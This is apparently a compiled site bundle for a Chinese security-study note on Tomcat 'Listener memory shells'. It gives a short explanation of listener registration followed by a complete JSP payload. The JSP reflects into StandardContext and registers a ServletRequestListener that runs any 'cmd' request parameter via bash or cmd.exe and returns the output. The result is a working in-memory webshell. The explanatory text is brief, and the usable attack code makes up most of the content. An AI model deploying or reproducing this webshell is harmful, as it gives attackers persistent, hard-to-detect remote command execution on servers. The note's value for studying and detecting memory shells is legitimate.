import{_ as i,c as o,J as n,m as a,a as e,V as c,o as r,E as s}from"./chunks/framework.WH0rnJL5.js";const u="/assets/tomcat.PUxm5DdT.png",d="/assets/image-20240430185709380.KDlF720k.png",L=JSON.parse('{"title":"Listener内存马","description":"","frontmatter":{},"headers":[],"relativePath":"笔记/👮🏻网络安全/Java/内存马/Tomcat/Listener内存马.md","filePath":"笔记/👮🏻网络安全/Java/内存马/Tomcat/Listener内存马.md"}'),q={name:"笔记/👮🏻网络安全/Java/内存马/Tomcat/Listener内存马.md"},g=a("h1",{id:"listener内存马",tabindex:"-1"},[e("Listener内存马 "),a("a",{class:"header-anchor",href:"#listener内存马","aria-label":'Permalink to "Listener内存马"'},"​")],-1),m=c('<h2 id="_1-基础知识" tabindex="-1">1.基础知识 <a class="header-anchor" href="#_1-基础知识" aria-label="Permalink to &quot;1.基础知识&quot;">​</a></h2><p><img src="'+u+'" alt="img"></p><p>如上图所示，Listener是最先注册调用到的。</p><h2 id="_2-原理分析" tabindex="-1">2.原理分析 <a class="header-anchor" href="#_2-原理分析" aria-label="Permalink to &quot;2.原理分析&quot;">​</a></h2><p>如下图所示：</p><p><img src="'+d+`" alt="image-20240430185709380"></p><p><code>Listener</code> 也是保存在 <code>standardContext</code> 中,添加方式比 <code>Filter</code> 简单。</p><p>通过<code>standardContext.addApplicationEventListener(servletRequestListener);</code> 就能够</p><p>注册监听器。</p><h2 id="_3-代码实现" tabindex="-1">3.代码实现 <a class="header-anchor" href="#_3-代码实现" aria-label="Permalink to &quot;3.代码实现&quot;">​</a></h2><div class="language-jsp vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsp</span><pre class="shiki shiki-themes github-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContextFacade&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //获取servletContext</span></span>
<span class="line"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    //获取ApplicationContextFacade对象</span></span>
<span class="line"><span>    Field applicationContextFacadeField = ApplicationContextFacade.class.getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    applicationContextFacadeField.setAccessible(true);</span></span>
<span class="line"><span>    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(servletContext);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    //获取applicationContext对象</span></span>
<span class="line"><span>    Field applicationContextField = ApplicationContext.class.getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    applicationContextField.setAccessible(true);</span></span>
<span class="line"><span>    StandardContext standardContext = (StandardContext) applicationContextField.get(applicationContext);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    ServletRequestListener servletRequestListener = new ServletRequestListener() {</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void requestDestroyed(ServletRequestEvent sre) {</span></span>
<span class="line"><span>            System.out.println(&quot;requestDestroyed&quot;);</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void requestInitialized(ServletRequestEvent sre) {</span></span>
<span class="line"><span>            HttpServletRequest servletRequest = (HttpServletRequest) sre.getServletRequest();</span></span>
<span class="line"><span>            if ( servletRequest.getParameter(&quot;cmd&quot;) != null ){</span></span>
<span class="line"><span>                try{</span></span>
<span class="line"><span>                    String os = System.getProperty(&quot;os&quot;);</span></span>
<span class="line"><span>                    boolean isLinux = true;</span></span>
<span class="line"><span>                    if (os != null &amp;&amp; os.contains(&quot;win&quot;)){</span></span>
<span class="line"><span>                        isLinux = false;</span></span>
<span class="line"><span>                    }</span></span>
<span class="line"><span>                    String[] exp = isLinux ? new String[]{&quot;bash&quot;,&quot;-c&quot;,request.getParameter(&quot;cmd&quot;)} : new String[]{&quot;cmd.exe&quot;,&quot;/c&quot;,request.getParameter(&quot;cmd&quot;)};</span></span>
<span class="line"><span>                    InputStream in  = Runtime.getRuntime().exec(exp).getInputStream();</span></span>
<span class="line"><span>                    Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;);</span></span>
<span class="line"><span>                    String output = s.hasNext() ? s.next() : &quot;&quot;;</span></span>
<span class="line"><span>                    response.getWriter().write(output);</span></span>
<span class="line"><span>                    response.getWriter().flush();</span></span>
<span class="line"><span>                }catch (IOException e){</span></span>
<span class="line"><span>                    e.printStackTrace();</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    };</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    standardContext.addApplicationEventListener(servletRequestListener);</span></span>
<span class="line"><span>    out.println(&quot;success...&quot;);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>%&gt;</span></span></code></pre></div><h2 id="贡献者" tabindex="-1">贡献者 <a class="header-anchor" href="#贡献者" aria-label="Permalink to &quot;贡献者&quot;">​</a></h2>`,12),x=a("h2",{id:"文件历史",tabindex:"-1"},[e("文件历史 "),a("a",{class:"header-anchor",href:"#文件历史","aria-label":'Permalink to "文件历史"'},"​")],-1);function h(_,v,C,S,b,F){const t=s("NolebasePageProperties"),p=s("NolebaseGitContributors"),l=s("NolebaseGitChangelog");return r(),o("div",null,[g,n(t),m,n(p),x,n(l)])}const P=i(q,[["render",h]]);export{L as __pageData,P as default};
